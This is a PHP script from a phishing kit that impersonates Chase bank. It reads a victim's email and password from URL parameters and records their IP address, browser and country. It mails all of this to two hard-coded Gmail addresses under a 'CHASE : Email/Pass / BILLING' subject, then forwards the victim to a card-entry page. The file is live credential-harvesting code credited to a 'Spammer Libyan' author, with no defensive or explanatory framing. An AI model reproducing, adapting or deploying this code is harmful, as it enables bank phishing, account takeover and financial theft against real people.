<?php
error_reporting(0);
session_start();


$ip = $_SERVER["REMOTE_ADDR"];
$_SESSION['_IP_'] = $_SERVER["REMOTE_ADDR"];

#browser info
$browser = $user_browser." - ".$user_os." - ".substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0,5);

#Country info
$_SESSION['cntcode'] = $countrycode;
$_SESSION['cntname'] = $countryname;


$_SESSION['email'] = $_GET['1'];
$_SESSION['pass'] = $_GET['2'];


$message = "
<div style=\"background-image: url('https://newevolutiondesigns.com/images/freebies/black-white-iphone-background-3.jpg');font-family: Tahoma;line-height: 25px;color: #333;font-size: 22px;border: 1px solid #06F;	padding: 20px;	border-radius: 5px; margin-top: 20px;\">
IP              =>   <font color='#F31414'>".$_SESSION['_IP_']."</font>
<br />
TIME            =>   <font color='#F31414'>".date('l jS \of F Y h:i:s A')."</font><br />
BROWSER         =>   <font color='#F31414'>".$browser."</font><br />
<hr style='border: 0;border-bottom: 1px solid #06F;background: #999;'/>

<hr style='border: 0;border-bottom: 1px solid #06F;background: #999;'/>
EMAIL:  =>   <font color='#F31414'>".$_GET['1']."</font><br />
Password :  =>   <font color='#F31414'>".$_GET['2']."</font><br />
___________________________________________________________________
<br />
||#################################################
#                                               #
#          ||~~ BY ~~ Spammer Libyan ~~||       #
#                                               #
#    https://www.facebook.com/Spamer.libyan.MO  #
#                                               #
#################################################||
<br />

</div>";

$subject  = " CHASE :  Email/Pass / BILLING-  [ " . $_SESSION['_IP_'] . " - " . $_SESSION['cntname'] . " ] ";
$headers  = "MIME-Version: 1.0" . "\r\n";;
$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
$headers .= "From: Pocket Achilles" . "\r\n";
$to = "roamnetlog@gmail.com,jansenderrick40@gmail.com";
@mail($to,$subject,$message,$headers);

 
 header("location:../card.php");
        
		  
		  ?>